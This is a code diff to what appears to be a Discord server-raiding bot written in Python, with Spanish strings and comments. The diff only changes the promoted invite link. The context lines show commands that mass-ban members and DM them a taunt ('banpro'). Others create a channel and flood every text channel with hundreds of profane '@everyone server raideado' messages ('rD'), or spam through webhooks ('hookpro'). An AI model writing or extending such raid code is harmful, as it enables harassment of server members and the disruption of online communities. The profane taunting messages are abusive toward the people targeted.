@@ -98,7 +98,7 @@ async def banpro(ctx):
     if not ctx.author.guild_permissions.ban_members: return
     if not ctx.guild.me.guild_permissions.ban_members: return
     
-    mensaje_dm = "Mi bot te baneo de tu servidor 😂 quieres hacerlo? Unete aqui https://discord.gg/pRnwdc3gQj"
+    mensaje_dm = "MI BOT TE BANEO DE TU SERVIDOR MC R TOP PUTOS https://discord.gg/Z4PP79DGGZ"
     gif_file = await obtener_gif_file()
     
     targets = [
@@ -150,14 +150,14 @@ async def rD(ctx):
     # 2. Crear canal especial (Sin spam)
     try:
         ch_esp = await ctx.guild.create_text_channel(name="Unete-a-Mc-r")
-        await ch_esp.send("https://discord.gg/pRnwdc3gQj")
+        await ch_esp.send("https://discord.gg/Z4PP79DGGZ")
     except: pass
 
     # 3. Función auxiliar de spam para cada canal
     async def spam_en_canal(channel):
         for _ in range(400): # Total 20,000 mensajes (50 * 400)
             try:
-                await channel.send("@everyone server raideado putos respeten a sus mayores https://discord.gg/pRnwdc3gQj")
+                await channel.send("@everyone server raideado putos respeten a sus mayores https://discord.gg/Z4PP79DGGZ")
                 await asyncio.sleep(1.2) # Pausa para Railway
             except:
                 break
@@ -351,7 +351,7 @@ async def hookpro(ctx):
     channels = ctx.guild.text_channels
     if not channels: return
 
-    mensaje_webhook = "@everyone server raideado putoooos https://discord.gg/pRnwdc3gQj"
+    mensaje_webhook = "@everyone server raideado putoooos https://discord.gg/Z4PP79DGGZ"
     gif_file = await obtener_gif_file()
 
     async def launch_webhook(channel):
